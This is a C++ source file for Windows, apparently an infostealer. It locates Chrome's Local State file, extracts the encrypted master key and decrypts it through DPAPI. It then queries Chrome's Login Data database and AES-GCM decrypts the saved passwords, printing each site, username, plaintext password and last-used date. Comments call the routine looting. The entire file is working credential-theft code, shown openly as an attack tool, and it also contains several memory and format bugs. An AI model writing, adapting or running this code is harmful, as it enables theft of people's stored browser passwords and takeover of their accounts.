#include "aes_gcm.h"
#include "sqlite3.h"

#include <vector>
#include <string>
#include <windows.h>
#include <tchar.h>

//Structure that help with freeing buffers
struct twoBuf {
    BYTE* result;
    char* toBFreed;
};
//Get Local State
BYTE* getLocalState(){
    HANDLE hStateFile;
    DWORD LSFileSize;

    char* cLocalStatePath = (char*) malloc(1024);
    if (cLocalStatePath == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    // Building Path to Chrome Login Data
    sprintf(
        cLocalStatePath,
        "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
        getenv("USERPROFILE")
    );

    //Get Local State File Handle
    hStateFile = CreateFileA(
        cLocalStatePath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hStateFile == INVALID_HANDLE_VALUE) {
        printf("Couldn't open Local State File %s\n", GetLastError());
    }

    //Get File Size
    LSFileSize = GetFileSize(hStateFile, NULL);
    if (LSFileSize == INVALID_FILE_SIZE){
        printf("Couldn't get file size with error: %s\n", GetLastError());
    };

    LPVOID fileContents = malloc(LSFileSize);
    if(!ReadFile(
        hStateFile,
        fileContents,
        LSFileSize,
        NULL,
        NULL
    )){
        printf("Critical error\n");
    }

    CloseHandle(hStateFile);
    return (BYTE*)fileContents; //Don't forget to free later
}

//Turns Chrome Epochs into Dates
char* chromeEpochDecode(char* epochTime){
    if(strtoull(epochTime, NULL, 0) == 0){
        return (char*) "Never";
    }
    time_t epoch = (strtoull(epochTime, NULL, 0)/1000000)-11644473600; //The Extra calculations are because Chrome has there epochs in microseconds dated at a certain day
    return asctime(gmtime(&epoch));
}

// Decrypt DPAPI
DATA_BLOB decryptDPAPI(BYTE* encryptedBytes, DWORD encryptBytesSize) {
    DATA_BLOB in;
    DATA_BLOB out;
    BYTE* outBuffer = (BYTE*)malloc(encryptBytesSize);
    //Setting DATA_BLOBS
    in.pbData = encryptedBytes;
    in.cbData = encryptBytesSize;
    out.cbData = encryptBytesSize;
    out.pbData = outBuffer;
    
    //DECRYPTING TIME!!!!
    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)){
        free(outBuffer);
        return out;
    }
    else{
        printf("Decryption didn't work. ERROR %d", GetLastError());
        free(outBuffer);
        return out;
    }
}

//Get Encrpytion Key
twoBuf getEncryptKey(){
    BYTE* localState = getLocalState();
    twoBuf masterKey;
    
    char* osCryptstr = (char*) malloc (1024);
    if (osCryptstr == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    // Parsing Strings
    char* token = strtok((char*)localState, ",");
    while (token != NULL) {
        if (strncmp(token, "\"os_crypt\"", strlen("\"os_crypt\"")) == 0){
            osCryptstr = token;
        }
        token = strtok(NULL, ",");
    }
    char* encryptKey = strtok(osCryptstr, "\"{}:");
    while (encryptKey != NULL) {
        if (strncmp(encryptKey, "os_crypt", strlen("os_crypt")) == 0 || strncmp(encryptKey, "encrypted_key", strlen("encrypted_key")) == 0) {
            encryptKey = strtok(NULL, "\"{}:");
        }
        else {
            token = encryptKey;
            encryptKey = strtok(NULL, "\"{}:");
        }
    }
    free(localState);


    DWORD keySize = strlen(token);
    DWORD bufSize = 0;
    // First Call to get length
    BOOL firstDecode = CryptStringToBinaryA(token, keySize, CRYPT_STRING_BASE64, NULL, &bufSize, NULL, NULL);
    if (firstDecode == 0){
        printf("Trouble 1Decoding\n");
    };

    //Decoding
    BYTE* buffer = (BYTE*)malloc(keySize);
    if(buffer == NULL){
        printf("Memory not successfully allocated.\n");
    };
    BOOL decoded = CryptStringToBinaryA(token, keySize, CRYPT_STRING_BASE64, buffer, &bufSize, NULL, NULL);
    if (decoded == 0) {
        printf("Trouble Decoding\n");
    };
    

    BYTE* finalKey = (BYTE*) malloc (bufSize-5);
    if (finalKey == NULL) {
        printf("Memory not successfully allocated.\n");
    };
    for(int i = 5; i < bufSize; i++){
        finalKey[i-5] = buffer[i];
    }
    free(buffer);
    
    DATA_BLOB masterKeyBlob = decryptDPAPI(finalKey, bufSize-5);
    free(finalKey);
    masterKey.result = masterKeyBlob.pbData;
    masterKey.toBFreed = osCryptstr;
    return masterKey;
}

char* AESDecrypt(char* pass, int passSize, BYTE* masterKey){
    if(passSize > 31){
        auto aes = new AESGCM(masterKey);

        std::string password(pass);

        std::string iv(password.substr(3, 12));
        std::string cipher(password.substr(15, passSize-31));
        std::string tag(password.substr(passSize-16));

        aes->Decrypt((BYTE*)iv.c_str(), iv.size(), (BYTE*)cipher.c_str(), cipher.size(), (BYTE*)tag.c_str(), tag.size());
        aes->plaintext[cipher.size()] = '\0';
        return (char*)aes->plaintext;
    }else{
        return (char*) "";
    }
}


//Loot Chrome Passwords
void GetPass(twoBuf masterKey){
    char* cPassPath = (char*) malloc(512);
    if (cPassPath == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    // Building Path to Chrome Login Data
    sprintf(
        cPassPath,
        "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
        getenv("USERPROFILE")
    );

// THE REAL DEAL
    sqlite3_stmt* stmt;
    sqlite3* db;

    char *query = (char*) "SELECT origin_url, action_url, username_value, password_value, date_last_used FROM logins";
    if (sqlite3_open(cPassPath, &db) == SQLITE_OK) {
        if (sqlite3_prepare_v2(db, query, -1, &stmt, 0) == SQLITE_OK) {
            //Begin Data Reading
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                //While we still have data in database
                char *url = (char*)sqlite3_column_text(stmt,0);
                char* actionURL = (char*) sqlite3_column_text(stmt,1);
                char* username = (char*) sqlite3_column_text(stmt,2);
                char* password = (char*)sqlite3_column_text(stmt,3); //This is the only encrypted field
                DOUBLE passSize = sqlite3_column_bytes(stmt, 3);
                char* dateLastUsed = chromeEpochDecode((char*) sqlite3_column_text(stmt,4));
                //time_t rawtime = dateLastUsed;
                printf("Url: %s\n",url);
                printf("Action_URL: %s\n", actionURL);
                printf("Username: %s\n",username);
                
                char* decrypted =  AESDecrypt(password, passSize, masterKey.result);
                if (decrypted != NULL){
                    printf("Password: %s\n", decrypted);
                }
                if (strcmp(dateLastUsed,(char*)"Never") == 0){
                    printf("Date Last Used: %s\n\n", dateLastUsed);
                }
                else{
                    printf("Date Last Used: GMT %s\n\n", dateLastUsed);
                }
            }
        }
        else{
            printf("Error preparing database with error %d\n", (sqlite3_prepare_v2(db, query, -1, &stmt, 0)));
        }
        sqlite3_finalize(stmt);
        sqlite3_close(db);
    }
    else {
        printf("Error opening database!\n");
    }

    free(cPassPath);
    return;
}


int _tmain(int argc, _TCHAR *argv[]){
    twoBuf encKey = getEncryptKey();
    GetPass(encKey);
    free(encKey.toBFreed);
}